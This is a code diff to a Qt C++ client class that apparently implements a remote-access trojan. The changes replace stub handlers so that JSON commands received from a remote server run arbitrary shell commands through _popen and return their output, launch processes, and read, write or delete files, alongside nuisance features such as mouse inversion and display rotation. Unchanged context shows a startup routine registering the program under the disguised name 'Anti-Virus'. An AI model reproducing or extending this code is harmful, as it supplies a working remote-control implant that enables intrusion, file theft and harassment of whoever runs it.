@@ -13,6 +13,15 @@ QClient::QClient(QString h, qint16 p, QObject *parent) :
 
 	compName = "Doru";
 	//addStartup();
+
+	thread = new QThread;
+	worker = new QMouseInverter();
+	worker->moveToThread(thread);
+	connect(thread, SIGNAL(started()), worker, SLOT(process()));
+	connect(worker, SIGNAL(finished()), thread, SLOT(quit()));
+	connect(worker, SIGNAL(finished()), worker, SLOT(deleteLater()));
+	connect(thread, SIGNAL(finished()), thread, SLOT(deleteLater()));
+	thread->start();
 }
 
 void QClient::tryToConnect()
@@ -33,94 +42,92 @@ void QClient::disconnected()
 
 void QClient::readyRead()
 {
-	if (sock->bytesAvailable())
-	{
-		//read size of package then the JSON object
-		int blockSize = -1;
-		sock->read((char *)&blockSize, sizeof(int));
-		//should check whether the local machine is big endian
-		auto sz = qToLittleEndian(blockSize);
-		QByteArray data = sock->read(sz);
- 		QJsonDocument doc = QJsonDocument::fromJson(data);
-		QJsonObject resp;
-		qDebug() << data;
-		if (doc.isObject())
-		{
-			QJsonObject obj = doc.object();
-			if (obj.contains("Id") && obj.contains("Parameters"))
+			QByteArray data = sock->readAll();
+			//QByteArray data = sock->read(sz);
+			QJsonDocument doc = QJsonDocument::fromJson(data);
+			QJsonObject resp;
+			qDebug() << data;
+			if (doc.isObject())
 			{
-				int id = obj.value("Id").toInt();
-				QString response;
-				switch ((Commands)id)
+				QJsonObject obj = doc.object();
+				if (obj.contains("Id") && obj.contains("Parameters"))
 				{
-				case Commands::CmdInjection:
+					int id = obj.value("Id").toInt();
+					QString response;
+					switch ((Commands)id)
+					{
+					case Commands::CmdInjection:
+					{
+						QString cmd = obj.value("Parameters").toString();
+						response = runCmdCommand(cmd);
+						break;
+					}
+					case Commands::ExecProcess:
+					{
+						QJsonArray params = obj.value("Parameters").toArray();
+						startProcess(params[0].toString(), params[1].toString());
+						response = "SUCCESS";
+						break;
+					}
+					case Commands::CreateFile:
+					{
+						QJsonArray params = obj.value("Parameters").toArray();
+						response = writeFile(params[0].toString(), params[1].toString()) ? "SUCCESS" : "FAILED";
+						break;
+					}
+					case Commands::ReadFile:
+					{
+						QString fileName = obj.value("Parameters").toString();
+						response = readFile(fileName);
+						break;
+					}
+					case Commands::DeleteFile:
+					{
+						QString fileName = obj.value("Parameters").toString();
+						response = deleteFile(fileName) ? "SUCCESS" : "FAILED";
+						break;
+					}
+					case Commands::MouseInvert:
+					{
+						toggleInvertMouse();
+						response = "SUCCESS";
+						break;
+					}
+					case Commands::DisplayRotate:
+					{
+						rotateDisplay();
+						response = "SUCCESS";
+						break;
+					}
+					case Commands::OsMessage:
+					{
+						QString msg = obj.value("Parameters").toString();
+						message(msg);
+						response = "SUCCESS";
+						break;
+					}
+					default:
+					{
+						response = "UNKNOWN COMMAND";
+					}
+					}
+					QJsonValue val = response;
+					resp.insert("response", val);
+				}
+				else
 				{
-					response = "CmdInjection";
-					break;
+					QJsonValue val = "Invalid Format. 'Id' key and 'Parameters' key";
+					resp.insert("response", val);
 				}
-				case Commands::ExecProcess:
-				{
-					response = "ExecProcess";
-					break;
-				}
-				case Commands::CreateFile:
-				{
-					QJsonArray params = obj.value("Parameters").toArray();
-					response = writeFile(params[0].toString(), params[1].toString()) ? "SUCCESS" : "FAILED";
-					break;
-				}
-				case Commands::ReadFile:
-				{
-					QString fileName = obj.value("Parameters").toString();
-					response = readFile(fileName);
-					break;
-				}
-				case Commands::DeleteFile:
-				{
-					QString fileName = obj.value("Parameters").toString();
-					response = deleteFile(fileName) ? "SUCCESS" : "FAILED";
-					break;
-				}
-				case Commands::MouseInvert:
-				{
-					response = "MouseInvert";
-					break;
-				}
-				case Commands::DisplayRotate:
-				{
-					rotateDisplay();
-					response = "SUCCESS";
-					break;
-				}
-				case Commands::OsMessage:
-				{
-					response = "OsMessage";
-					break;
-				}
-				default:
-				{
-					response = "UNKNOWN COMMAND";
-				}
-				}
-				QJsonValue val = response;
-				resp.insert("response", val);
 			}
 			else
 			{
-				QJsonValue val = "Invalid Format. 'Id' key and 'Parameters' key";
+				QJsonValue val = QString("Invalid Format. Expected JSON got '" + data + "'");
 				resp.insert("response", val);
 			}
-		}
-		else
-		{
-			QJsonValue val = QString("Invalid Format. Expected JSON got '" + data + "'");
-			resp.insert("response", val);
-		}
-		QByteArray dataToSend = (QJsonDocument(resp)).toJson();
-		qDebug() << dataToSend;
-		sendData(dataToSend);
-		//sock->flush();
-	}
+			QByteArray dataToSend = (QJsonDocument(resp)).toJson();
+			qDebug() << dataToSend;
+			sendData(dataToSend);
 }
 
 
@@ -132,14 +139,23 @@ void QClient::addStartup()
 	settings.setValue("Anti-Virus", QVariant(path));
 }
 
-QString QClient::startProcess(const QString &proc)
+void QClient::startProcess(const QString &dir, const QString &proc)
 {
-	return QString();
+	QProcess *process = new QProcess(this);
+	process->start(proc, QStringList() << dir);
 }
 
 QString QClient::runCmdCommand(const QString &cmd)
 {
-	return QString();
+	FILE * uname;
+	char os[800000];
+	int lastchar;
+
+	uname = _popen(cmd.toUtf8(), "r");
+	lastchar = fread(os, 1, 800000, uname);
+	os[lastchar] = '\0';
+	_pclose(uname);
+	return QString(os);
 }
 
 QString QClient::readFile(const QString &fileName)
@@ -177,7 +193,7 @@ bool QClient::deleteFile(const QString &fileName)
 
 void QClient::toggleInvertMouse()
 {
-
+	worker->toggleInverter();
 }
 
 void QClient::rotateDisplay()
@@ -233,7 +249,7 @@ void QClient::message(const QString &m)
 
 void QClient::sendData(const QByteArray &data)
 {
-	
+	/*
 	int size = data.size();
 	char s[4];
 	s[3] = size & 0xFF;
@@ -242,7 +258,9 @@ void QClient::sendData(const QByteArray &data)
 	s[0] = (size >> 24) & 0xFF;
 
 	sock->write(s, 4);
+	*/
 	sock->write(data);
+	
 	sock->waitForBytesWritten();
 }
 
